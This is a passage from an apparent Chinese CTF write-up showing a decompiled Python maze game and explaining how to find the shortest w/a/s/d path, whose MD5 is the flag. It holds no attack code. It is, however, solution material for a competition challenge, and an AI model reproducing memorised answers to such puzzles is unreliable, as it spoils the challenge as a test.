punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Mice walk in a maze: wasd to move,q to quit'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag is the shortest path's md5,example:if the shortest path is wasdsdw,the flag is md5('wasdsdw')"</span><span class="token punctuation">)</span>  i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  n <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> i <span class="token operator">==</span> row <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> j <span class="token operator">==</span> col <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ohhhh!!!!you did it'</span><span class="token punctuation">)</span>              <span class="token keyword">break</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'your position:(&#123;&#125;,&#123;&#125;)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>          inp <span class="token operator">=</span> msvcrt<span class="token punctuation">.</span>getch<span class="token punctuation">(</span><span class="token punctuation">)</span>          n <span class="token operator">+=</span> <span class="token number">1</span>          ti<span class="token punctuation">,</span> tj <span class="token operator">=</span> i<span class="token punctuation">,</span> j          <span class="token keyword">if</span> <span class="token string">b'a'</span> <span class="token operator">==</span> inp <span class="token keyword">and</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>              tj <span class="token operator">-=</span> <span class="token number">1</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> <span class="token string">b'w'</span> <span class="token operator">==</span> inp <span class="token keyword">and</span> j <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                  ti <span class="token operator">-=</span> <span class="token number">1</span>              <span class="token keyword">else</span><span class="token punctuation">:</span>                  <span class="token keyword">if</span> <span class="token string">b's'</span> <span class="token operator">==</span> inp <span class="token keyword">and</span> j <span class="token operator">&lt;</span> row <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">:</span>                      ti <span class="token operator">+=</span> <span class="token number">1</span>                  <span class="token keyword">else</span><span class="token punctuation">:</span>                      <span class="token keyword">if</span> <span class="token string">b'd'</span> <span class="token operator">==</span> inp <span class="token keyword">and</span> i <span class="token operator">&lt;</span> col <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">:</span>                          tj <span class="token operator">+=</span> <span class="token number">1</span>                      <span class="token keyword">else</span><span class="token punctuation">:</span>                          <span class="token keyword">if</span> <span class="token string">b'q'</span> <span class="token operator">==</span> inp<span class="token punctuation">:</span>                              exit<span class="token punctuation">(</span><span class="token string">'bye!!'</span><span class="token punctuation">)</span>                          <span class="token keyword">else</span><span class="token punctuation">:</span>                              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'What???'</span><span class="token punctuation">)</span>                              <span class="token keyword">continue</span>          <span class="token keyword">if</span> maze<span class="token punctuation">[</span>ti<span class="token punctuation">]</span><span class="token punctuation">[</span>tj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'no wayy!!'</span><span class="token punctuation">,</span> <span class="token string">"it's wall"</span><span class="token punctuation">,</span> <span class="token string">'nop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">continue</span>      <span class="token keyword">elif</span> maze<span class="token punctuation">[</span>ti<span class="token punctuation">]</span><span class="token punctuation">[</span>tj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'nice!!'</span><span class="token punctuation">,</span> <span class="token string">'yeah!!'</span><span class="token punctuation">,</span> <span class="token string">'Go on'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          i<span class="token punctuation">,</span> j <span class="token operator">=</span> ti<span class="token punctuation">,</span> tj</code></pre></li><li><p>根据代码逻辑，<code>i, j = (0, 1)</code> 代表初始位置在 (0, 1)，即迷宫的左上角那个 0 的地方，1 代表墙壁，只能顺着 0 的地方走；后面的代码就是控制每一步的移动，上下左右分别用 “wsad” 代替，因此不需要运行后面的代码，只需要自己得出最终路径即可</p></li><li><p><em><strong>这里可以将迷宫中的 <code>&quot;1&quot;</code> 去掉，只需要关注 <code>&quot;0&quot;</code> 的上下左右即可</strong></em></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token 